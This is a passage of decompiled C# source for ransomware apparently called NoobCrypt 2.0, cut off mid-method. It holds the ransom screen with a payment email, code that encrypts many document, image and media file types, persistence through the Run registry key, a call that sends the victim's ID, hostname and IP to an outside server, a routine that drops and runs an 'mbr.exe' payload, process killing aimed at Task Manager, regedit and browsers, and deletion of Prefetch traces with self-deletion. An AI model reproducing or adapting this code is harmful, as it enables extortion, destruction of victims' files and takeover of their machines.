		((Control)label16).set_Size(size);
		((Control)Label18).set_TabIndex(12);
		Label18.set_Text("✓");
		Label16.set_AutoSize(true);
		((Control)Label16).set_ForeColor(Color.White);
		Label label17 = Label16;
		location = new Point(10, 42);
		((Control)label17).set_Location(location);
		((Control)Label16).set_Name("Label16");
		Label label18 = Label16;
		size = new Size(109, 13);
		((Control)label18).set_Size(size);
		((Control)Label16).set_TabIndex(10);
		Label16.set_Text("Disable Safe Boot");
		Label15.set_AutoSize(true);
		((Control)Label15).set_ForeColor(Color.Red);
		Label label19 = Label15;
		location = new Point(151, 29);
		((Control)label19).set_Location(location);
		((Control)Label15).set_Name("Label15");
		Label label20 = Label15;
		size = new Size(15, 13);
		((Control)label20).set_Size(size);
		((Control)Label15).set_TabIndex(9);
		Label15.set_Text("X");
		Label14.set_AutoSize(true);
		((Control)Label14).set_ForeColor(Color.FromArgb(0, 192, 0));
		Label label21 = Label14;
		location = new Point(151, 29);
		((Control)label21).set_Location(location);
		((Control)Label14).set_Name("Label14");
		Label label22 = Label14;
		size = new Size(15, 13);
		((Control)label22).set_Size(size);
		((Control)Label14).set_TabIndex(8);
		Label14.set_Text("✓");
		((Control)Label14).set_Visible(false);
		Label3.set_AutoSize(true);
		((Control)Label3).set_ForeColor(Color.White);
		Label label23 = Label3;
		location = new Point(10, 29);
		((Control)label23).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label24 = Label3;
		size = new Size(136, 13);
		((Control)label24).set_Size(size);
		((Control)Label3).set_TabIndex(8);
		Label3.set_Text("System Restore Points");
		Label9.set_AutoSize(true);
		((Control)Label9).set_Font(new Font("Verdana", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label9).set_ForeColor(Color.Yellow);
		Label label25 = Label9;
		location = new Point(456, 461);
		((Control)label25).set_Location(location);
		((Control)Label9).set_Name("Label9");
		Label label26 = Label9;
		size = new Size(174, 16);
		((Control)label26).set_Size(size);
		((Control)Label9).set_TabIndex(20);
		Label9.set_Text("YOUR PAYMENT STATUS:");
		NSButton nsButton = NsButton2;
		location = new Point(726, 445);
		((Control)nsButton).set_Location(location);
		((Control)NsButton2).set_Name("NsButton2");
		NSButton nsButton2 = NsButton2;
		size = new Size(138, 52);
		((Control)nsButton2).set_Size(size);
		((Control)NsButton2).set_TabIndex(19);
		((Control)NsButton2).set_Text("CHECK THE PAYMENT");
		((Control)NsGroupBox2).get_Controls().Add((Control)(object)Label13);
		((Control)NsGroupBox2).get_Controls().Add((Control)(object)Label12);
		((Control)NsGroupBox2).get_Controls().Add((Control)(object)Label8);
		NsGroupBox2.DrawSeperator = false;
		NSGroupBox nsGroupBox3 = NsGroupBox2;
		location = new Point(676, 46);
		((Control)nsGroupBox3).set_Location(location);
		((Control)NsGroupBox2).set_Name("NsGroupBox2");
		NSGroupBox nsGroupBox4 = NsGroupBox2;
		size = new Size(188, 152);
		((Control)nsGroupBox4).set_Size(size);
		NsGroupBox2.SubTitle = "";
		((Control)NsGroupBox2).set_TabIndex(5);
		((Control)NsGroupBox2).set_Text("NsGroupBox2");
		NsGroupBox2.Title = "READ HERE!";
		Label13.set_AutoSize(true);
		((Control)Label13).set_ForeColor(Color.White);
		Label label27 = Label13;
		location = new Point(10, 80);
		((Control)label27).set_Location(location);
		((Control)Label13).set_Name("Label13");
		Label label28 = Label13;
		size = new Size(167, 52);
		((Control)label28).set_Size(size);
		((Control)Label13).set_TabIndex(7);
		Label13.set_Text("In order to pay, send us an \r\nemail with your UNIQUE ID \r\nand we will send you the\r\ninstructions how to pay!");
		Label12.set_AutoSize(true);
		((Control)Label12).set_ForeColor(Color.FromArgb(0, 192, 0));
		Label label29 = Label12;
		location = new Point(32, 53);
		((Control)label29).set_Location(location);
		((Control)Label12).set_Name("Label12");
		Label label30 = Label12;
		size = new Size(134, 13);
		((Control)label30).set_Size(size);
		((Control)Label12).set_TabIndex(6);
		Label12.set_Text("noobcrypt@sigaint.org");
		Label8.set_AutoSize(true);
		((Control)Label8).set_ForeColor(Color.White);
		Label label31 = Label8;
		location = new Point(3, 28);
		((Control)label31).set_Location(location);
		((Control)Label8).set_Name("Label8");
		Label label32 = Label8;
		size = new Size(181, 13);
		((Control)label32).set_Size(size);
		((Control)Label8).set_TabIndex(5);
		Label8.set_Text("We manually check payments.\r\n");
		Label6.set_AutoSize(true);
		((Control)Label6).set_Cursor(Cursors.get_Hand());
		((Control)Label6).set_Font(new Font("Verdana", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		Label label33 = Label6;
		location = new Point(272, 59);
		((Control)label33).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label34 = Label6;
		size = new Size(285, 38);
		((Control)label34).set_Size(size);
		((Control)Label6).set_TabIndex(8);
		Label6.set_Text("@JakubKroustek");
		((Control)NsTextBox1).set_Cursor(Cursors.get_IBeam());
		NSTextBox nsTextBox3 = NsTextBox1;
		location = new Point(136, 458);
		((Control)nsTextBox3).set_Location(location);
		NsTextBox1.MaxLength = 32767;
		NsTextBox1.Multiline = false;
		((Control)NsTextBox1).set_Name("NsTextBox1");
		NsTextBox1.ReadOnly = true;
		NSTextBox nsTextBox4 = NsTextBox1;
		size = new Size(261, 23);
		((Control)nsTextBox4).set_Size(size);
		((Control)NsTextBox1).set_TabIndex(17);
		NsTextBox1.Text = "UID";
		NsTextBox1.TextAlign = (HorizontalAlignment)2;
		NsTextBox1.UseSystemPasswordChar = false;
		Label4.set_AutoSize(true);
		((Control)Label4).set_ForeColor(Color.White);
		Label label35 = Label4;
		location = new Point(65, 351);
		((Control)label35).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label36 = Label4;
		size = new Size(757, 91);
		((Control)label36).set_Size(size);
		((Control)Label4).set_TabIndex(5);
		Label4.set_Text(componentResourceManager.GetString("Label4.Text"));
		Label10.set_AutoSize(true);
		((Control)Label10).set_Font(new Font("Verdana", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label10).set_ForeColor(Color.Yellow);
		Label label37 = Label10;
		location = new Point(15, 461);
		((Control)label37).set_Location(location);
		((Control)Label10).set_Name("Label10");
		Label label38 = Label10;
		size = new Size(124, 16);
		((Control)label38).set_Size(size);
		((Control)Label10).set_TabIndex(16);
		Label10.set_Text("YOUR UNIQUE ID:");
		NSSeperator nsSeperator = NsSeperator1;
		location = new Point(3, 333);
		((Control)nsSeperator).set_Location(location);
		((Control)NsSeperator1).set_Name("NsSeperator1");
		NSSeperator nsSeperator2 = NsSeperator1;
		size = new Size(870, 23);
		((Control)nsSeperator2).set_Size(size);
		((Control)NsSeperator1).set_TabIndex(11);
		((Control)NsSeperator1).set_Text("NsSeperator1");
		Label7.set_AutoSize(true);
		((Control)Label7).set_ForeColor(Color.White);
		Label label39 = Label7;
		location = new Point(243, 46);
		((Control)label39).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label40 = Label7;
		size = new Size(68, 13);
		((Control)label40).set_Size(size);
		((Control)Label7).set_TabIndex(9);
		Label7.set_Text("Thanks to:");
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Verdana", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.Red);
		Label label41 = Label5;
		location = new Point(185, 314);
		((Control)label41).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label42 = Label5;
		size = new Size(474, 16);
		((Control)label42).set_Size(size);
		((Control)Label5).set_TabIndex(6);
		Label5.set_Text("Your PC is blocked due to at least one of the reasons specified below.");
		((Control)NsGroupBox1).get_Controls().Add((Control)(object)Label11);
		((Control)NsGroupBox1).get_Controls().Add((Control)(object)NsLabel3);
		((Control)NsGroupBox1).get_Controls().Add((Control)(object)Label2);
		((Control)NsGroupBox1).get_Controls().Add((Control)(object)Label1);
		((Control)NsGroupBox1).get_Controls().Add((Control)(object)NsLabel2);
		((Control)NsGroupBox1).get_Controls().Add((Control)(object)NsLabel1);
		NsGroupBox1.DrawSeperator = false;
		NSGroupBox nsGroupBox5 = NsGroupBox1;
		location = new Point(12, 46);
		((Control)nsGroupBox5).set_Location(location);
		((Control)NsGroupBox1).set_Name("NsGroupBox1");
		NSGroupBox nsGroupBox6 = NsGroupBox1;
		size = new Size(188, 95);
		((Control)nsGroupBox6).set_Size(size);
		NsGroupBox1.SubTitle = "";
		((Control)NsGroupBox1).set_TabIndex(0);
		((Control)NsGroupBox1).set_Text("NsGroupBox1");
		NsGroupBox1.Title = "User Informations";
		Label11.set_AutoSize(true);
		((Control)Label11).set_ForeColor(Color.White);
		Label label43 = Label11;
		location = new Point(53, 65);
		((Control)label43).set_Location(location);
		((Control)Label11).set_Name("Label11");
		Label label44 = Label11;
		size = new Size(40, 13);
		((Control)label44).set_Size(size);
		((Control)Label11).set_TabIndex(6);
		Label11.set_Text("{y/n}");
		((Control)NsLabel3).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		NSLabel nsLabel = NsLabel3;
		location = new Point(3, 60);
		((Control)nsLabel).set_Location(location);
		((Control)NsLabel3).set_Name("NsLabel3");
		NSLabel nsLabel2 = NsLabel3;
		size = new Size(49, 23);
		((Control)nsLabel2).set_Size(size);
		((Control)NsLabel3).set_TabIndex(5);
		((Control)NsLabel3).set_Text("NsLabel3");
		NsLabel3.Value1 = "ADMIN:";
		NsLabel3.Value2 = "";
		Label2.set_AutoSize(true);
		((Control)Label2).set_ForeColor(Color.White);
		Label label45 = Label2;
		location = new Point(42, 47);
		((Control)label45).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label46 = Label2;
		size = new Size(55, 13);
		((Control)label46).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("{status}");
		Label1.set_AutoSize(true);
		((Control)Label1).set_ForeColor(Color.White);
		Label label47 = Label1;
		location = new Point(23, 29);
		((Control)label47).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label48 = Label1;
		size = new Size(55, 13);
		((Control)label48).set_Size(size);
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("{status}");
		((Control)NsLabel2).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		NSLabel nsLabel3 = NsLabel2;
		location = new Point(3, 42);
		((Control)nsLabel3).set_Location(location);
		((Control)NsLabel2).set_Name("NsLabel2");
		NSLabel nsLabel4 = NsLabel2;
		size = new Size(49, 23);
		((Control)nsLabel4).set_Size(size);
		((Control)NsLabel2).set_TabIndex(1);
		((Control)NsLabel2).set_Text("NsLabel2");
		NsLabel2.Value1 = "HOST:";
		NsLabel2.Value2 = "";
		((Control)NsLabel1).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		NSLabel nsLabel5 = NsLabel1;
		location = new Point(3, 25);
		((Control)nsLabel5).set_Location(location);
		((Control)NsLabel1).set_Name("NsLabel1");
		NSLabel nsLabel6 = NsLabel1;
		size = new Size(26, 23);
		((Control)nsLabel6).set_Size(size);
		((Control)NsLabel1).set_TabIndex(0);
		((Control)NsLabel1).set_Text("NsLabel1");
		NsLabel1.Value1 = "IP:";
		NsLabel1.Value2 = "";
		((Control)PictureBox1).set_BackColor(Color.Transparent);
		PictureBox1.set_Image((Image)(object)Resources.test2);
		PictureBox pictureBox = PictureBox1;
		location = new Point(149, 32);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(643, 331);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		PictureBox1.set_TabIndex(7);
		PictureBox1.set_TabStop(false);
		Button button = Button1;
		location = new Point(767, 462);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(22);
		((ButtonBase)Button1).set_Text("Times Up");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(876, 509);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)NsTheme1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)NsTheme1).ResumeLayout(false);
		((Control)NsTheme1).PerformLayout();
		((Control)NsGroupBox3).ResumeLayout(false);
		((Control)NsGroupBox3).PerformLayout();
		((Control)NsGroupBox2).ResumeLayout(false);
		((Control)NsGroupBox2).PerformLayout();
		((Control)NsGroupBox1).ResumeLayout(false);
		((Control)NsGroupBox1).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void ClearTrace()
	{
		try
		{
			string[] files = Directory.GetFiles("C:\\Windows\\Prefetch\\", "NOOBCRYPT*", SearchOption.AllDirectories);
			foreach (string text in files)
			{
				FileSystem.Kill(text);
			}
		}
		catch (UnauthorizedAccessException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files2 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "MBR*", SearchOption.AllDirectories);
			foreach (string text2 in files2)
			{
				FileSystem.Kill(text2);
			}
		}
		catch (UnauthorizedAccessException projectError2)
		{
			ProjectData.SetProjectError((Exception)projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files3 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "UNINSTALL*", SearchOption.AllDirectories);
			foreach (string text3 in files3)
			{
				FileSystem.Kill(text3);
			}
		}
		catch (UnauthorizedAccessException projectError3)
		{
			ProjectData.SetProjectError((Exception)projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files4 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "README*", SearchOption.AllDirectories);
			foreach (string text4 in files4)
			{
				FileSystem.Kill(text4);
			}
		}
		catch (UnauthorizedAccessException projectError4)
		{
			ProjectData.SetProjectError((Exception)projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files5 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "WEVTUTIL*", SearchOption.AllDirectories);
			foreach (string text5 in files5)
			{
				FileSystem.Kill(text5);
			}
		}
		catch (UnauthorizedAccessException projectError5)
		{
			ProjectData.SetProjectError((Exception)projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files6 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "DLLHOST*", SearchOption.AllDirectories);
			foreach (string text6 in files6)
			{
				FileSystem.Kill(text6);
			}
		}
		catch (UnauthorizedAccessException projectError6)
		{
			ProjectData.SetProjectError((Exception)projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files7 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "REG*", SearchOption.AllDirectories);
			foreach (string text7 in files7)
			{
				FileSystem.Kill(text7);
			}
		}
		catch (UnauthorizedAccessException projectError7)
		{
			ProjectData.SetProjectError((Exception)projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files8 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "SESSION*", SearchOption.AllDirectories);
			foreach (string text8 in files8)
			{
				FileSystem.Kill(text8);
			}
		}
		catch (UnauthorizedAccessException projectError8)
		{
			ProjectData.SetProjectError((Exception)projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files9 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "RUNDLL*", SearchOption.AllDirectories);
			foreach (string text9 in files9)
			{
				FileSystem.Kill(text9);
			}
		}
		catch (UnauthorizedAccessException projectError9)
		{
			ProjectData.SetProjectError((Exception)projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files10 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "CONSENT*", SearchOption.AllDirectories);
			foreach (string text10 in files10)
			{
				FileSystem.Kill(text10);
			}
		}
		catch (UnauthorizedAccessException projectError10)
		{
			ProjectData.SetProjectError((Exception)projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files11 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "MMC*", SearchOption.AllDirectories);
			foreach (string text11 in files11)
			{
				FileSystem.Kill(text11);
			}
		}
		catch (UnauthorizedAccessException projectError11)
		{
			ProjectData.SetProjectError((Exception)projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files12 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "BOOTMGR*", SearchOption.AllDirectories);
			foreach (string text12 in files12)
			{
				FileSystem.Kill(text12);
			}
		}
		catch (UnauthorizedAccessException projectError12)
		{
			ProjectData.SetProjectError((Exception)projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files13 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "WUAPIHOST*", SearchOption.AllDirectories);
			foreach (string text13 in files13)
			{
				FileSystem.Kill(text13);
			}
		}
		catch (UnauthorizedAccessException projectError13)
		{
			ProjectData.SetProjectError((Exception)projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] files14 = Directory.GetFiles("C:\\Windows\\Prefetch\\", "CMD*", SearchOption.AllDirectories);
			foreach (string text14 in files14)
			{
				FileSystem.Kill(text14);
			}
		}
		catch (UnauthorizedAccessException projectError14)
		{
			ProjectData.SetProjectError((Exception)projectError14);
			ProjectData.ClearProjectError();
		}
		string tempPath = Path.GetTempPath();
		FileInfo[] files15 = new DirectoryInfo(tempPath).GetFiles("*.*");
		foreach (FileInfo fileInfo in files15)
		{
			try
			{
				fileInfo.Delete();
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
		}
		Thread.Sleep(100);
	}

	private void FuckPc()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		WebClient webClient = default(WebClient);
		int num2 = default(int);
		int num3 = default(int);
		string text = default(string);
		string temp = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					webClient = new WebClient();
					goto IL_000a;
				case 182:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0029;
						case 4:
							goto IL_0031;
						case 5:
							goto IL_003f;
						case 6:
							goto IL_0057;
						case 7:
							goto IL_0066;
						case 8:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 9:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0066:
					num = 7;
					File.WriteAllBytes(text, Resources.mbr);
					break;
					IL_0057:
					num = 6;
					text = temp + "mbr.exe";
					goto IL_0066;
					IL_000a:
					num = 2;
					webClient.DownloadFile(URLtoFile, FilePath + "data.bin");
					goto IL_0029;
					IL_0029:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0031;
					IL_0031:
					num = 4;
					aakam = 1000;
					goto IL_003f;
					IL_003f:
					num = 5;
					temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_0057;
					end_IL_0001_2:
					break;
				}
				num = 8;
				Process.Start(text);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 182;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public object getMacAddress()
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		return allNetworkInterfaces[0].GetPhysicalAddress().ToString();
	}

	public bool IsFirstRun()
	{
		bool flag = true;
		string fileName = Path.GetFileName(Application.get_ExecutablePath());
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(fileName);
		if (registryKey == null)
		{
			flag = true;
			registryKey = Registry.CurrentUser.CreateSubKey(fileName);
			RegistryKey registryKey2 = registryKey;
			registryKey2.SetValue(fileName, fileName);
			registryKey2.Close();
			registryKey2 = null;
		}
		else
		{
			flag = false;
		}
		return flag;
	}

	private void EnumRestorePoints()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
		ManagementObjectCollection instances = val.GetInstances();
		StringBuilder stringBuilder = new StringBuilder();
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = instances.GetEnumerator();
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				stringBuilder.AppendLine((string)((ManagementBaseObject)val2).get_Item("description") + Conversions.ToString(Convert.ToChar(9)) + Conversions.ToUInteger(((ManagementBaseObject)val2).get_Item("sequencenumber")));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		MessageBox.Show(stringBuilder.ToString());
	}

	public void method_0()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("shell.application", ""));
		NewLateBinding.LateCall(objectValue, (Type)null, "MinimizeAll", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		objectValue = null;
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
			MessageBox.Show("You cannot close this.", "Windows", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void melt(int timeout)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe");
		processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w " + timeout + " > Nul & Del \"" + Application.get_ExecutablePath() + "\"";
		processStartInfo.CreateNoWindow = true;
		processStartInfo.ErrorDialog = false;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
		Application.ExitThread();
	}

	public void RunAtStartup(string ApplicationName, string ApplicationPath)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		RegistryKey registryKey2 = registryKey;
		registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey2.SetValue(ApplicationName, ApplicationPath);
		registryKey2 = null;
	}

	public void RemoveValue(string ApplicationName)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		RegistryKey registryKey2 = registryKey;
		registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey2.DeleteValue(ApplicationName, throwOnMissingValue: false);
		registryKey2 = null;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			RunAtStartup(Application.get_ProductName(), Application.get_ExecutablePath());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		NoobCrypt2._0.FileEncrypter.FileEncrypter.EncryptFiles("txt", "doc", "dot", "docx", "docm", "dotx", "dotm", "docb", "rtf", "wpd", "pdf", "xls", "xlt", "xlm", "xlsx", "xlsm", "xltx", "xltm", "xlsb", "cdx", "xla", "xlam", "xll", "xlw", "ppt", "pot", "pps", "pptx", "pptm", "potx", "potm", "ppam", "ppsx", "ppsm", "sldx", "sldm", "accdb", "db", "dbf", "mdb", "pdb", "sql", "jpg", "jpeg", "raw", "tif", "gif", "png", "bmp", "wav", "mp3", "aif", "iff", "m3u", "m4u", "mid", "mpa", "wma", "ra", "avi", "mov", "mp4", "3gp", "3g2", "asf", "asx", "flv", "wmv", "vob", "m3u8", "ico");
		ProtectProcess.cProtect();
		if (IsFirstRun())
		{
			BackgroundWorker2.RunWorkerAsync();
		}
		string hostName = Dns.GetHostName();
		object obj = null;
		IPAddress[] addressList = Dns.GetHostEntry(hostName).AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			obj = iPAddress.ToString();
			Label1.set_Text(Conversions.ToString(obj));
			Label2.set_Text(hostName.ToString());
		}
		byte[] array = (byte[])NewLateBinding.LateGet((object)SHA1.Create(), (Type)null, "ComputeHash", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)Encoding.UTF8, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(getMacAddress()) }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null, (bool[])null);
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = array.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				stringBuilder.Append(array[num2].ToString("x2"));
				num2++;
			}
			((Control)this).set_Visible(true);
			NsTextBox1.Text = stringBuilder.ToString();
			WebClient webClient = new WebClient();
			webClient.DownloadString("http://vreaucoduripentrujocuri.com/script.php?uuid=" + stringBuilder.ToString() + "&hostname=" + hostName.ToString() + "&ip=" + obj.ToString());
			Thread.Sleep(200);
			((Control)this).set_Visible(true);
			method_0();
			((Control)this).set_Visible(true);
			((Control)Label22).set_Visible(true);
			Timer1.Start();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
			{
				Label11.set_Text("YES");
			}
			else
			{
				Label11.set_Text("NO");
			}
			((Control)this).set_Visible(true);
			if (IsFirstRun())
			{
			}
		}
	}

	public void Block()
	{
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName("regedit");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Thread.Sleep(100);
		}
	}

	public string method_1()
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CLASSES_ROOT\\HTTP\\shell\\open\\command", "", (object)"Not Found"));
		string[] array = Strings.Split(text, "\"", -1, (CompareMethod)0);
		return Path.GetFileNameWithoutExtension(array[1]);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_0170: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("explorer");
		try
		{
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Process[] processesByName2 = Process.GetProcessesByName("taskmgr");
		try
		{
			Process[] array2 = processesByName2;
			foreach (Process process2 in array2)
			{
				process2.Kill();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName3 = Process.GetProcessesByName(method_1());
			foreach (Process process3 in processesByName3)
			{
				string text = process3.MainWindowTitle.ToString().ToLower();
				if (text.Contains("facebook") | text.Contains("youtube") | text.Contains("virus") | text.Contains("infected") | text.Contains("search") | text.Contains("windows") | text.Contains("bing") | text.Contains("nuova scheda") | text.Contains("new tab") | text.Contains("cerca") | text.Contains("malwarebites") | text.Contains("help") | text.Contains("kij"))
				{
					process3.Kill();
					((Control)this).Focus();
					Interaction.MsgBox((object)"Internet surfing is disabled until you complete the survey or choose any other option to download the file with the product key.", (MsgBoxStyle)16, (object)null);
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		NoobCrypt2._0.FileEncrypter.FileEncrypter.DecryptFiles("txt", "doc", "dot", "docx", "docm", "dotx", "dotm", "docb", "rtf", "wpd", "pdf", "xls", "xlt", "xlm", "xlsx", "xlsm", "xltx", "xltm", "xlsb", "cdx", "xla", "xlam", "xll", "xlw", "ppt", "pot", "pps", "pptx", "pptm", "potx", "potm", "ppam", "ppsx", "ppsm", "sldx", "sldm", "accdb", "db", "dbf", "mdb", "pdb", "sql", "jpg", "jpeg", "raw", "tif", "gif", "png", "bmp", "wav", "mp3", "aif", "iff", "m3u", "m4u", "mid", "mpa", "wma", "ra", "avi", "mov", "mp4", "3gp", "3g2", "asf", "asx", "flv", "wmv", "vob", "m3u8", "ico");
		ClearTrace();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(folderPath + "\\svchost.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
